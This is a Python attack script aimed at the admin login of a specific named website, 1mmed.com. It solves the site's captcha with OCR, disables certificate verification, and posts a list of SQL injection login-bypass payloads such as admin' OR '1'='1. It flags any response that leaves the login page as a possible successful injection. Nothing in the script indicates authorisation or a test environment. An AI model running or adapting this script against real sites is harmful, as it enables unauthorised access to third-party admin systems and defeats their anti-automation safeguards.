#!/usr/bin/env python3
"""1mmed TP3登录SQLi测试"""
import urllib.request, http.cookiejar, ssl, re, urllib.parse
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
ocr = ddddocr.DdddOcr(show_ad=False)

cap = op.open("http://1mmed.com/admin.php/Code/index", timeout=8).read()
code = ocr.classification(cap)
print(f"code={code}", flush=True)

payloads = [
    ("admin", "admin' OR '1'='1"),
    ("admin", "admin' OR '1'='1' -- "),
    ("admin", "admin' OR 1=1#"),
    ("' OR 1=1#", "123456"),
    ("admin'--", "123456"),
    ("admin", "123456' OR '1'='1"),
]
for u, p in payloads:
    data = urllib.parse.urlencode({"username":u,"pwd":p,"code":code,"TenantId":""}).encode()
    try:
        r = op.open(urllib.request.Request("http://1mmed.com/admin.php", data=data), timeout=8)
        url = r.geturl()
        body = r.read().decode("utf-8","ignore")
        print(f"{u!r}/{p!r}: {url} len={len(body)}", flush=True)
        if "Login" not in url:
            print("  !!! 可能注入成功!", flush=True)
    except Exception as e:
        print(f"{u!r}/{p!r}: ERR {str(e)[:40]}", flush=True)
